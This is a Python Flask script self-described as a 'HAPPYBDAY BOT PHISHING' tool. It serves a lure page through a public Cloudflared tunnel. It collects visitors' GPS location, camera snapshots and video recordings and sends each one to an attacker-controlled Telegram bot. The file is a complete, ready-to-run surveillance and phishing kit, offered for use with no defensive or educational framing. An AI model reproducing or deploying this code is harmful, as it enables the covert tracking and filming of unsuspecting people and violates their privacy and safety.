#!/usr/bin/env python3
import os
import base64
import time
import threading
import subprocess
import requests
from flask import Flask, render_template, request, jsonify

# ================= CONFIG =================
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ================= BANNER =================
def banner():
    print("""
========================================
                 ZPXEL
         HAPPYBDAY BOT PHISHING
Author : Jay
Buy me a coffee ☕ 0945-156-2226
========================================
""")

# ================= FLASK APP =================
app = Flask(__name__, template_folder="templates", static_folder="static")

# ================= TELEGRAM FUNCTIONS =================
def send_photo(path, BOT_TOKEN, CHAT_ID):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(path, "rb") as f:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": f})

def send_video(path, BOT_TOKEN, CHAT_ID):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    with open(path, "rb") as f:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"video": f})

def send_location_telegram(lat, lon, accuracy, source, BOT_TOKEN, CHAT_ID):
    url_map = f"https://www.google.com/maps?q={lat},{lon}"
    msg = f"User location (via {source}):📍 {url_map}  Accuracy: {round(accuracy, 1)} meters estimated from user location"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
    except Exception as e:
        print("Failed to send location:", e)

# ================= ROUTES =================
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload/location", methods=["POST"])
def upload_location():
    data = request.json
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    accuracy = data.get("accuracy")
    source = data.get("source", "unknown")

    BOT_TOKEN = app.config["BOT_TOKEN"]
    CHAT_ID = app.config["CHAT_ID"]

    if latitude and longitude:
        send_location_telegram(latitude, longitude, accuracy, source, BOT_TOKEN, CHAT_ID)

    return jsonify({"status": "ok"})

@app.route("/upload/image", methods=["POST"])
def upload_image():
    data = request.json
    img = base64.b64decode(data["original"].split(",")[1])
    path = f"{UPLOAD_DIR}/img_{int(time.time())}.png"
    with open(path, "wb") as f:
        f.write(img)

    BOT_TOKEN = app.config["BOT_TOKEN"]
    CHAT_ID = app.config["CHAT_ID"]
    send_photo(path, BOT_TOKEN, CHAT_ID)
    return jsonify({"status": "ok"})

@app.route("/upload/video", methods=["POST"])
def upload_video():
    file = request.files["original"]
    path = f"{UPLOAD_DIR}/vid_{int(time.time())}.webm"
    file.save(path)

    BOT_TOKEN = app.config["BOT_TOKEN"]
    CHAT_ID = app.config["CHAT_ID"]
    send_video(path, BOT_TOKEN, CHAT_ID)
    return jsonify({"status": "ok"})

# ================= CLOUDFLARED TUNNEL =================
def start_cloudflared():
    time.sleep(2)  # wait for Flask
    print("🌐 Starting Cloudflared tunnel...")
    proc = subprocess.Popen(
        ["cloudflared","tunnel","--url","127.0.0.1:5000/."],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    for line in proc.stdout:
        print(line.strip())
        if "trycloudflare.com" in line:
            import re
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if match:
                print(f"\n✅ Public URL: {match.group()}")
                break

# ================= MAIN FUNCTION =================
def main():
    BOT_TOKEN = input("🤖 Telegram Bot Token: ").strip()
    CHAT_ID   = input("💬 Telegram Chat ID: ").strip()

    # Store tokens in Flask app config
    app.config["BOT_TOKEN"] = BOT_TOKEN
    app.config["CHAT_ID"] = CHAT_ID

    banner()

    threading.Thread(target=start_cloudflared, daemon=True).start()
    print("🔥 Local server running on http://localhost:5000")

    # Run Flask server
    app.run(host="0.0.0.0", port=5000)

# Optional top-level run
if __name__ == "__main__":
    main()
